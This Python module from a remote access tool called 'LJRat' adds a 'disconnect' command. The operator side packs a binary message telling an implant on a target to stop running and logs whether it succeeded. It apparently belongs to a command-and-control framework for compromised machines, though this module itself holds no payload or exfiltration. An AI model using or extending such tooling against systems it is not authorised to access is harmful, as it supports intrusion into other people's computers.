"""
Module that adds the disconnect functionality to LJRat
"""

import struct
import message
import os
import log
from error import *
from helper import str_to_c_str, get_timestamp_str
from globals import ctx
from session import HEADER_LEN, INT_SIZE

MODULE_ID = 0x05
LOADABLE = False
DLL_NAME = None
PARENT = None

def entrypoint(self, args):
    """ Stop implant from running on target
    'disconnect'
    """

    module_args = {"JOB_ID": ctx.get_next_job()}
    msg = message.Message(_serialize(module_args))
    return (msg, E_SUCCESS)

def validator(args):
    '''Function to validate arguments'''
    return

def _serialize(data):
    '''Function to take all the required arguments and pack a data structure with binary data'''
    serialized_data = bytearray()

    result_code = 0
    cmd_type = MODULE_ID
    job_id = data["JOB_ID"]
    data_len = HEADER_LEN + INT_SIZE

    serialized_data.extend(struct.pack("I", data_len))
    serialized_data.extend(struct.pack("I", job_id))
    serialized_data.extend(struct.pack("I", cmd_type))
    serialized_data.extend(struct.pack("I", result_code))
    serialized_data.extend(struct.pack("I", 0)) # Unused int to conform to server specification

    return serialized_data

def _deserialize(msg):
    '''Function that calls the formatter and outputs the data to a log'''
    log_dir = ctx.log_dir

    if msg.result_code == E_SUCCESS:
        log.write_to_log(log_dir, ".disconnect", ERROR_TABLE[msg.result_code], "Disonnect command successful")
    else:
        print(f"Error disconnecting: {ERROR_TABLE[msg.result_code]}")

    return